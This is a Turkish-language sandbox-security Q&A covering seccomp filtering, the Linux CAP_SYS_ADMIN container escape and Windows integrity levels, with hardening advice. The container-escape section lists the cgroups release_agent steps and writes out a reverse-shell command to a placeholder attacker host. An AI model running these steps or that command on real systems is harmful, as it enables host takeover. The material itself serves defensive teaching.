# Gün 149: Uygulama İzinleri ve Sandbox — Soru & Cevap

---

## 1. Soru: Seccomp-BPF Sistem Çağrısı Filtrelemesinde Denylist'in İflası

### Soru
Linux Seccomp-BPF sistem çağrısı filtrelemesinde Denylist (Kara Liste) yaklaşımının iflas etmesinin temel çekirdek dinamikleri nelerdir ve modern saldırganlar `io_uring` ya da `open_by_handle_at` gibi sistem çağrılarıyla bu filtreleri nasıl delmektedir?

### Detaylı ve Kapsamlı Teknik Cevap
Seccomp-BPF, çekirdek seviyesinde sistem çağrısı (syscall) denetimi yapan kural tabanlı bir sanal makinedir. Güvenlik mimarları sıklıkla iki tasarım modelinden birini seçerler:
1. **Denylist (Kara Liste):** Varsayılan olarak her şeye izin ver (`SECCOMP_RET_ALLOW`), yalnızca bilinen tehlikeli sistem çağrılarını (`ptrace`, `bpf`, `mount`, `reboot`) engelle.
2. **Allowlist (Beyaz Liste):** Varsayılan olarak her şeyi reddet (`SECCOMP_RET_ERRNO` veya `SECCOMP_RET_KILL_PROCESS`), yalnızca uygulamanın meşru çalışması için profil çıkarılarak onaylanmış çağrılara (`read`, `write`, `exit_group`, `mmap`) izin ver.

Denylist yaklaşımının iflas etmesinin birinci sebebi, Linux çekirdeğinin yaşayan ve her sürümde yeni sistem çağrıları eklenen devasa bir kod tabanı olmasıdır. Örneğin Linux 5.1 ile gelen `io_uring` alt sistemi, asenkron G/Ç işlemleri için kuyruk tabanlı bir mimari sunar. Saldırgan, seccomp filtresinde `read` veya `write` çağrıları engellenmiş olsa bile `io_uring_setup` ve `io_uring_enter` çağrılarını kullanarak engelleri tamamen baypas edebilir. Hatta `io_uring` alt sisteminde 2021-2023 yılları arasında düzinelerce çekirdek bellek taşması ve yetki yükseltme (LPE) zafiyeti keşfedilmiştir. Eğer filtre denylist kullanıyorsa ve kural yazarı `io_uring` çağrısını engellemeyi akıl edememişse, saldırgan doğrudan çekirdek seviyesinde kod çalıştırır.

İkinci kritik örnek `open_by_handle_at` sistem çağrısıdır. Klasik chroot tabanlı sandbox'larda saldırganın `/` dizininin yukarısına çıkması engellenir. Ancak `open_by_handle_at`, bir dosya tanıtıcısı (file handle) üzerinden dosya açtığı için chroot sınırlarını hiçe sayar (meşhur *Shocker exploit*). Eğer seccomp filtresi sadece `open` ve `openat` çağrılarını izliyor ama `open_by_handle_at` çağrısını kara listeye almamışsa, saldırgan ana makinenin kök dosya sistemine doğrudan erişir. Bu sebeple kurumsal standartlar (NIST SP 800-190 ve CIS Docker Benchmark) kesinlikle Denylist yaklaşımını yasaklar ve katı Allowlist kullanımını şart koşar.

### Ustanın Çırağa Tavsiyesi / Altın Kural
"Evlat, kapıyı ardına kadar açık bırakıp içeri girmesini istemediğin 10 kişinin resmini kapıya asarsan, 11. hırsız içeri elini kolunu sallayarak girer. Sandbox yapıyorsan kapıyı çelik sürgüyle kapatacaksın; sadece kimliğini bildiğin, parmak izini aldığın 5 çağrının geçmesine izin vereceksin. Varsayılan eylem `SECCOMP_RET_KILL` ya da `SECCOMP_RET_ERRNO` olacak; aksini öneren mimara derhal mimariyi terk etmesini söyleyeceksin."

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2022 yılında popüler bir bulut sağlayıcısının paylaşımlı konteyner çalıştırma platformunda güvenlik araştırmacıları tarafından kritik bir kaçış zafiyeti keşfedildi. Platform, konteynerleri varsayılan Docker seccomp profiliyle çalıştırıyordu ancak profilde yeni eklenen `fsopen`, `fsmount` ve `move_mount` gibi yeni nesil dosya sistemi çağrıları kara listede yer almıyordu. Saldırgan araştırmacılar, unconfined olan `fsopen` çağrısı üzerinden çekirdek dosya sistemi bağlamını manipüle ederek ana makinenin `/etc/shadow` dosyasına ulaştılar ve tüm ana makine düğümünü (host node) ele geçirdiler. Olayın ardından sağlayıcı tüm altyapısını katı allowlist tabanlı gVisor ve Firecracker mikroVM mimarisine taşımak zorunda kaldı.

---

## 2. Soru: Konteynerlerde `CAP_SYS_ADMIN` İhaneti ve Host Kaçışı

### Soru
Bir mikroservis veya konteyner sandbox'ında `CAP_SYS_ADMIN` yeteneği verildiğinde, bu durum neden fiilen ana makinenin (host) `root` kullanıcısı haline gelmekle eşdeğerdir ve saldırgan bu yeteneği kullanarak `release_agent` veya dosya sistemi mount hileleriyle ana makineye nasıl kaçar?

### Detaylı ve Kapsamlı Teknik Cevap
Linux çekirdeğinde `CAP_SYS_ADMIN`, "diğer yeteneklere sığmayan tüm sistem yöneticisi işlevlerinin toplandığı süper yetenektir". Bir geliştirici bir konteynere dosya sistemi bağlamak (`mount`), sanal diskleri biçimlendirmek veya bazı donanım sensörlerini okumak için `--cap-add=SYS_ADMIN` verdiğinde, farkında olmadan saldırgana çekirdeğin anahtarlarını teslim etmiş olur.

`CAP_SYS_ADMIN` ile ana makineye kaçışın en bilinen yöntemi **cgroups release_agent istismarıdır**:
1. Linux cgroups v1 mimarisinde, bir cgroup içerisindeki son süreç sonlandığında çekirdek tarafından tetiklenen bir bildirim mekanizması bulunur: `release_agent`. Bu dosyanın içerisine bir betik yolu yazılır.
2. Konteyner içinde `CAP_SYS_ADMIN` yetkisine sahip olan saldırgan, geçici bir cgroup hiyerarşisi oluşturup bağlayabilir (`mount -t cgroup -o memory cgroup /tmp/cgrp`).
3. Saldırgan konteyner içindeki kendi kök dizininde bir zararlı betik oluşturur (örn: `/cmd.sh` -> içerisine ana makinenin ters kabuk açması için `bash -i >& /dev/tcp/saldırgan/4444 0>&1` yazar) ve çalıştırılabilir yapar.
4. Ardından konteynerin ana makinedeki gerçek depolama yolunu `/etc/mtab` veya `/proc/mounts` üzerinden tespit eder (örn: `/var/lib/docker/overlay2/.../merged/cmd.sh`).
5. Bu ana makine yolunu yeni açtığı cgroup'un `release_agent` dosyasına yazar ve `notify_on_release` bayrağını `1` yapar.
6. Son olarak cgroup içerisine anlık ölecek bir sahte süreç başlatır (`sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"`).
7. Süreç bittiği anda ana makine çekirdeği (Kernel Ring 0), ana makinenin doğrudan `root` yetkisiyle `release_agent` içinde tanımlanan `/cmd.sh` betiğini çalıştırır! Konteyner duvarı sıfır saniyede çöker ve saldırgan ana makinenin mutlak hakimi olur.

İkinci yöntem ise doğrudan `/dev` aygıtlarına erişimdir. Eğer konteyner `--privileged` ile veya uygunsuz aygıt eşlemesiyle açılmışsa, `CAP_SYS_ADMIN` saldırganın `mknod` ile ana makine disk blok aygıtını (`/dev/sda1`) oluşturmasına ve doğrudan ana makine işletim sistemini yerel bir dizine bağlamasına olanak tanır.

### Ustanın Çırağa Tavsiyesi / Altın Kural
"Çırak, production ortamında bir geliştirici sana gelip 'Abi bizim konteyner çalışmıyor, stackoverflow'da `--cap-add=SYS_ADMIN` ya da `--privileged` ekleyin düzelir demişler, onu ekleyelim mi?' derse, o gün ona güvenlik dersi verme günündür. Bir konteynere `CAP_SYS_ADMIN` vermek, evinin kapısını açık bırakıp kilidin üzerine anahtarı asmakla aynı şeydir. Konteynerin kökünü her zaman `--read-only` yapacaksın, yetenekleri `--cap-drop=ALL` ile sıfırlayacaksın; spesifik olarak ne lazımsa sadece onu vereceksin."

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2020 yılında küresel bir finans kuruluşunun Kubernetes kümesinde çalışan faturalandırma mikroservisi, NFS paylaşımlarını dinamik bağlayabilmek amacıyla DevOps ekibi tarafından `CAP_SYS_ADMIN` yetkisiyle devreye alınmıştı. Uygulamadaki bir Log4j / deserialization açığı üzerinden pod içine sızan tehdit aktörü, cgroups `release_agent` tekniğini koşturarak 45 saniye içerisinde Kubernetes worker node'unun çekirdeğine zıpladı. Oradan kubelet kimlik bilgilerini çalarak tüm kümedeki diğer 120 hassas veritabanı pod'una erişim sağladı. Adli bilişim incelemesinde felaketin tek bir capability yetkilendirmesinden kaynaklandığı tespit edildi.

---

## 3. Soru: Windows Bütünlük Seviyeleri (MIC), AppContainer ve UIPI Savunması

### Soru
Windows Zorunlu Bütünlük Kontrolü (MIC) ve AppContainer mimarisinde "No Write Up" ve UIPI (User Interface Privilege Isolation) mekanizmaları saldırganın `WM_COPYDATA` veya DLL injection yoluyla yüksek yetkili süreçlere sıçramasını nasıl engeller; bu korumanın kırıldığı uç nokta zafiyetleri nelerdir?

### Detaylı ve Kapsamlı Teknik Cevap
Windows işletim sisteminde geleneksel DACL (Discretionary Access Control List) mekanizması yetersiz kaldığında devreye Mandatory Integrity Control (MIC) girer. MIC, her güvenlik belirtecine (Access Token) ve her güvenli nesneye (Dosya, Kayıt Defteri, Süreç, Pencere Kolu) bir bütünlük SID'si (`SECURITY_MANDATORY_LABEL_AUTHORITY`) atar.

MIC'in iki temel kuralı vardır:
1. **No Write Up:** Düşük bütünlük seviyesindeki (örn: `LOW`) bir süreç, kendisinden yüksek seviyedeki (örn: `MEDIUM` veya `HIGH`) bir nesneye yazamaz, onu değiştiremez veya o sürece `PROCESS_VM_WRITE` / `CreateRemoteThread` ile kod enjekte edemez.
2. **No Read Up (İsteğe bağlı/Gizlilik):** Varsayılan olarak okumaya izin verilir ancak yazma kesinlikle engellenir.

Ancak süreçler arası haberleşmede bir başka büyük delik vardı: Windows Pencere Mesajları (Windows Messages). Klasik mimaride, aynı masaüstünde çalışan herhangi bir uygulama, başka bir uygulamanın penceresine `SendMessage(hwnd, WM_COPYDATA, ...)` veya `WM_DROPFILES` gibi mesajlar göndererek onu manipüle edebilirdi (Shatter Attack). 

İşte bu noktada **UIPI (User Interface Privilege Isolation)** devreye girdi. UIPI kuralına göre:
* Daha düşük bütünlük seviyesindeki bir süreç, daha yüksek bütünlük seviyesindeki bir pencereye mesaj gönderemez (`WM_KEYDOWN`, `WM_COMMAND`, `WM_COPYDATA` çekirdek tarafından sessizce engellenir).
* Yalnızca `ChangeWindowMessageFilterEx` API'si ile açıkça izin verilen istisnai sistem mesajları geçebilir.

**AppContainer** ise bu izolasyonu bir adım daha ileri götürür:
AppContainer'da çalışan bir süreç (örneğin Edge render süreci ya da Microsoft Defender Sandbox motoru):
* Kendi özel AppContainer SID'sine sahiptir (`S-1-15-2-...`).
* Ağ arabirimine doğrudan bağlanamaz; Windows Güvenlik Duvarı (WFP), AppContainer SID'sini denetleyerek internet veya yerel ağ izinlerini ayrı ayrı bloklar.
* Yerel RPC (ALPC) uç noktalarına erişimi sınırlandırılmıştır.

**Bu korumanın kırıldığı zafiyetler (Bypass Vektörleri):**
1. **Named Pipe / COM Impersonation Açıkları:** Düşük yetkili süreç, yüksek yetkili bir servisi kendi oluşturduğu bir Named Pipe'a bağlanmaya zorlarsa ve servis `ImpersonateNamedPipeClient` çağrısı yaparken impersonation token seviyesini doğru kısıtlamazsa, saldırgan orta/yüksek seviyeli token elde edebilir.
2. **GDI / DWM Çekirdek Açıkları:** Windows pencere yöneticisi (DWM - Desktop Window Manager) ve `win32k.sys` çekirdek sürücüsündeki kullanım sonrası serbest bırakma (Use-After-Free) açıkları, Low Integrity sürecin doğrudan çekirdek belleğini bozarak High/System yetkisine zıplamasına olanak tanır.

### Ustanın Çırağa Tavsiyesi / Altın Kural
"Çırak, Windows üzerinde güvenilmeyen bir kod koşturacaksan (ister kullanıcıdan gelen makro olsun, ister dışarıdan indirilen dosya dönüştürücü), sadece 'Standart Kullanıcı' ile çalıştırmak sandbox değildir. Sürecin token'ını açacaksın; `TOKEN_MANDATORY_LABEL` ile bütünlük seviyesini `LOW` yapacaksın, `SeDebugPrivilege` ve `SeImpersonatePrivilege` yetkilerini kazıyıp atacaksın ve süreci mümkünse AppContainer içinde başlatacaksın. Çekirdek pencere mesajlarını bile bloke etmelidir."

### Gerçek Hayat Senaryosu / Yaşanmış Olay
Chromium tabanlı tarayıcılarda geçmişte yaşanan meşhur sandbox kaçışlarında saldırganlar, JavaScript motorundaki (V8) bir RCE açığı ile tarayıcının render sürecini ele geçirmişlerdi. Ancak render süreci Windows AppContainer ve LOW Integrity seviyesinde çalıştığı için saldırganlar diske tek bir dosya bile yazamadılar. Saldırganlar ana makineye sızabilmek için `win32k.sys` grafik sürücüsündeki sıfır-günlük (0-day) bir bellek taşması açığını kullanarak doğrudan çekirdeğe saldırdılar ve sandbox zincirini kırdılar. Bu olayın ardından Google ve Microsoft, Chrome sandbox'ında `win32k.sys` çağrılarını tamamen kapatan "Win32k Lockdown" seccomp benzeri bir Windows politika katmanı geliştirdi.
